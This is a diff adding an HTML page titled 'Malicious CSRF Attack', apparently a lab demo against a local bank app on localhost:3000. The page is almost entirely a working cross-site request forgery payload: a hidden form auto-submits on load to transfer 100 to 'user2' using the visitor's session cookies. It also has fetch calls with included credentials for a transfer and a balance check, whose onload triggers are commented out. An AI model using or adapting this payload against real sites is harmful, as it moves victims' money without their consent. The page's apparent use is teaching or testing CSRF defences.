@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious CSRF Attack</title>
+</head>
+<body>
+    <h1>Malicious CSRF Attack</h1>
+    <p>If you are logged into the bank application, this page will attempt to transfer money from your account!</p>
+    <form style="display: none;" action="http://localhost:3000/transfer" method="POST">
+        <input type="hidden" name="to" value="user2"></input>
+        <input type="hidden" name="amount" value="100"></input>
+        <input type="submit" value="transfer"/>
+    </form>
+    <script>
+        // Automatically send a request to the bank's transfer endpoint
+        const transferMoney = async () => {
+            const response = await fetch('http://localhost:3000/transfer', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json' // This header is necessary for JSON payload
+                },
+                body: JSON.stringify({ to: 'user2', amount: 100 }), // Attacker's target
+                credentials: 'include', // Include cookies in the request
+            });
+            const data = await response.json();
+            console.log(data);
+        };
+
+        // Execute the transfer when the page loads
+        // window.onload = transferMoney;
+        const checkBalance = async () => {
+            const response = await fetch('http://localhost:3000/balance', {
+                method: 'GET',
+                headers: {
+                    'Content-Type': 'application/json' // This header is necessary for JSON payload
+                },
+                credentials: 'include', // Include cookies in the request
+            });
+            // const data = await response.json();
+            console.log(response);
+        }
+
+        // window.onload = checkBalance;
+        document.querySelector('form').submit();
+    </script>
+</body>
+</html>
